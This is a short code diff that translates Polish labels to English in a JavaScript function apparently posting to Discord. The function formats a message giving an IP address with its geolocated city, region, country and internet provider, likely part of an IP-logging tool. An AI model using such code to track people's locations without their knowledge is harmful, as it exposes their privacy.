@@ -38,11 +38,11 @@ let postujdodc = async (ip) => {
   
   var myEmbed = {
     author: {
-      name: `${random} | Adres IP: ${ip}`,
+      name: `${random} | IP: ${ip}`,
       icon_url: `${json.country_flag}`
     },
-    title: `Miasto: **${json.city}** | Wojewodztwo: **${json.state_prov}**`,
-    description: `Kraj: **${json.country_name}** | Dostawca Internetu: **${json.isp}**`,
+    title: `City: **${json.city}** | State/Providence: **${json.state_prov}**`,
+    description: `Country: **${json.country_name}** | Internet Service Provider: **${json.isp}**`,
     color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
   }
   
